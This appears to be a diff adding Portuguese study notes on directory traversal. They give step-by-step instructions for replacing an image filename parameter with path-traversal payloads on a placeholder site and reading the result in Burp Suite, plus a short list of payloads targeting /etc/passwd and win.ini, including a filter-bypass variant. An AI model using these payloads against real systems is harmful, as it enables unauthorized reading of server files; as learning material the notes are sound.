@@ -1,0 +1,35 @@
+O DIRECTORY TRAVERSAL É UMA VULNERABILIDADE EM QUE VOCÊ ATRAVESSA DIRETÓRIOS NA INTENÇÃO DE ACESSAR DIRETÓRIOS FORA DA PASTA RAÍZ DA WEB.
+
+	ISSO OCORRE QUANDO ALGUM PAYLOAD LÊ DIRETÓRIOS AO INVÉS DE ID, COMUMENTE ISSO OCORRE QUANDO 			
+	SE CARREGA IMAGENS.
+	
+	1.ACHAR ARQUIVO QUE TENHA: filename= OU file=
+		
+		EX: <img src="/loadImage?filename=218.png">
+		
+	2.ENTRAR NA IMAGEM.
+	
+	3.ALTERAR O PAYLOAD DO FILE OU FILENAME PELA URL DA IMAGEM:
+	
+		EX: https://insecure-website.com/loadImage?filename=../../../etc/passwd
+		
+	4.IR EM 'Proxy' NO BURPSUITE.
+	
+	5.IR EM 'HTTP history'.
+	
+	6.CLICAR NA REQUISIÇÃO QUE TEM O PAYLOAD QUE VOCÊ COLOCOU.
+	
+	7.IR EM 'Response'.
+	
+	8.IR EM 'Raw' LÁ TERÁ OS DADOS CAPTURADOS.
+	
+	PAYLOADS PARA SE USAR:
+	
+		../../../etc/passwd
+		
+		...//...//...//etc/passwd
+		
+		.\..\..\windows\win.ini
+		
+		
+
